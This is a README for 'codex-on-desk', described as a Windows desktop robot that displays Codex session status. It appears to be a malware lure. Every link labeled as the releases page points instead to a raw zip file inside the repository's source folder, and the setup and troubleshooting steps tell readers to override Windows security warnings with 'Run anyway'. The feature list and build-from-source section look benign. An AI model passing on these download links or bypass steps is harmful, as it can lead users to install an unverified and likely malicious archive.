# 🤖 codex-on-desk - Keep Codex State in Sight

[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)

## 🖥️ What this app does

codex-on-desk is a small desktop app for Windows. It sits on your desktop and shows the current state of your local Codex session with a robot and a speech bubble.

It helps you see what Codex is doing at a glance:

- Thinking
- Running tasks
- Showing an error
- Finishing work
- Sleeping when idle

It can also:

- Find local Codex sessions on its own
- Connect to an existing `codex app-server`
- Show more than one source at the same time
- Save your display settings on your PC

## 📥 Download

Go to the releases page and download the latest Windows file:

[Open the releases page](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)

On that page, look for the newest release and download the Windows version. After the file finishes downloading, open it to start the app.

## 🪟 Windows setup

1. Open the download from the releases page.
2. If Windows asks for permission, choose **Run** or **Yes**.
3. If you get a security screen, choose **More info** first, then choose **Run anyway** if you trust the source.
4. Follow the on-screen setup steps.
5. Start codex-on-desk from the Desktop or Start menu if a shortcut was created.

If you use Windows PowerShell and see an `npm.ps1` restriction message while setting up from source, use `npm.cmd` instead. That is only needed for people who install from the source folder.

## ✨ Features

- Real-time Codex status display
- Robot animation tied to session state
- Speech bubble with short or detailed text
- Bubble on or off
- Bubble distance control
- Three connection modes
  - `auto` scans `~/.codex/sessions/**/*.jsonl`
  - `managed` starts `codex app-server` for you
  - `external` connects to an existing `codex app-server`
- Multi-source support
- Desktop window with transparency
- Drag support
- Double-click interaction
- Saved settings in `settings.json`
- Windows and macOS build support

## 🧭 First run

When you open the app for the first time, it may take a moment to find your Codex session.

If Codex is already running, the app will try to match the session state and show it on screen. If no session is active yet, the robot may stay in an idle state until work begins.

## ⚙️ Basic use

### Status bubble

The bubble can show a short or detailed message. Use the short view if you want a clean desktop. Use the detailed view if you want more context about what Codex is doing.

### Robot size

Choose one of these sizes:

- S
- M
- L

Use a smaller size if you want the app to stay out of the way. Use a larger size if you want it to stand out more.

### Color theme

You can pick from preset theme colors or enter a custom hex color. This changes the look of the robot and the bubble.

### Desktop position

You can drag the window around your desktop. Place it where it does not block your work.

## 🔌 Connection modes

### `auto`

Use this if you want the app to look for local Codex session files on its own. This is the easiest mode for most users.

### `managed`

Use this if you want the app to start `codex app-server` for you. This works well when you want the app to handle the full connection flow.

### `external`

Use this if you already have a running `codex app-server`. The app connects to it instead of starting a new one.

## 🧰 Settings

codex-on-desk saves common settings on your machine in `settings.json`. This includes things like:

- Window position
- Bubble state
- Bubble detail level
- Robot size
- Theme choice
- Connection mode

Your saved settings stay local to your PC.

## 📁 What you may see after launch

After you start the app, you may see:

- A small robot on your desktop
- A speech bubble near the robot
- Changes when Codex starts thinking or running tasks
- Idle feedback when Codex is not active

If multiple sources are active, the app combines them into one status view.

## 🛠️ If you want to build from source

This part is only for users who want to work from the project files.

1. Install Node.js on your computer.
2. Open a terminal in the project folder.
3. Install dependencies:

```bash
npm install
```

4. If PowerShell blocks `npm.ps1`, use:

```bash
npm.cmd install
```

5. Start the app in development mode with the project scripts in the repository.
6. Build a release package only when you need it. The project downloads `electron-builder` on demand for distribution tasks.

## 🖱️ Common actions

- Move the robot: drag the window
- Change what the bubble shows: open the app settings
- Hide the bubble: turn off the bubble option
- Make the robot larger or smaller: change the size setting
- Switch themes: choose a preset color or enter a hex color
- Use another Codex source: change the connection mode

## ❓ Troubleshooting

### The app does not show any status

- Check that Codex is running
- Wait a few moments for the session to appear
- Try a different connection mode
- If you use `external`, confirm that `codex app-server` is running

### The window does not stay where I placed it

- Move the window again
- Close the app normally so it can save the current position
- Check that your user account can write local app settings

### The app looks too large or too small

- Change the robot size to S, M, or L
- Adjust the bubble distance setting
- Try a different theme if the current one feels too strong

### I downloaded the file but nothing happens

- Make sure the download finished
- Try opening the file again from your Downloads folder
- If Windows blocks it, choose the option to run it anyway after you review the prompt

## 📌 Release download

[Visit the releases page to download the Windows version](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)

## 🔍 Project name

codex-on-desk

## 🧩 Short path for Windows users

1. Open the releases page.
2. Download the latest Windows file.
3. Open the file.
4. Follow the screen prompts.
5. Start using the desktop robot